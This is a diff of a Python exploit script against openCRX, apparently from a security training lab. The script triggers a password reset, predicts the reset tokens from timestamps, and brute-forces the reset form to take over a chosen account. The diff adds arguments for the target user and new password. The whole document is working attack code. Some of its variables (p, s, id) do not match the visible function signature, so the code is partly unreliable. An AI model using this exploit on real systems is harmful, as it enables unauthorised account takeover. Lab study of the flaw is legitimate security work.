@@ -54,9 +54,9 @@ def resetPassword(token_list, host="192.168.137.126", password="password", princ
         print(t)
         data = {
                 't': t,
-                'p': 'CRX',
-                's': 'Standard',
-                'id': 'guest',
+                'p': p,
+                's': s,
+                'id': id,
                 'password1': password,
                 'password2': password
                 }
@@ -96,15 +96,17 @@ def resetPassword(token_list, host="192.168.137.126", password="password", princ
     print("(-)Unable to find a valid token")
     sys.exit(-1)
 
-def requestPasswordReset(host="192.168.137.126", id="guest"):
+def requestPasswordReset(host="192.168.137.126", user="guest"):
     """
     This function will perform a password reset 
     """
     print("(*) Requesting Password Reset")
+    print("args.user: {}".format(user))
 
     proxies = {"http": "http://127.0.0.1:8080"}
     url = "http://{}:8080/opencrx-core-CRX/RequestPasswordReset.jsp".format(host)
-    data = { "id": "{}@{}/{}".format("guest", "CRX", "Standard") }
+    data = { "id": '{}@{}/{}'.format(user, "CRX", "Standard") }
+    print(data)
 
     r = requests.post(url, data=data, proxies=proxies)
     print(r.text)
@@ -123,13 +125,21 @@ def main():
     """
     This is the main function
     """
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--user', '-user', nargs = '?', default = 'guest')
+    parser.add_argument('--password', '-password', nargs = '?', default = 'password')
+    args = parser.parse_args()
+    print("args.id: {}".format(args.user))
+
     start_time = int(time.time() * 1000)
-    end_time = requestPasswordReset()
+    end_time = requestPasswordReset(user=args.user)
     print("start_time: {}".format(start_time))
     print("end_time: {}".format(end_time))
     tokens = generateTokenList(start_time, end_time)
     #resetPassword(tokens, host="192.168.137.126", password1="hax0r1234", password2="haxor1234", principal="guest", provider="CRX", segment="Standard")
-    resetPassword(tokens)
+    #resetPassword(token_list, host="192.168.137.126", password="password", principal="guest", provider="CRX", segment="Standard")
+    resetPassword(tokens, password=args.password, principal=args.user)
+    #resetPassword(tokens)
     #resetPassword('./java_tokens.txt')
 
 if __name__ == "__main__":
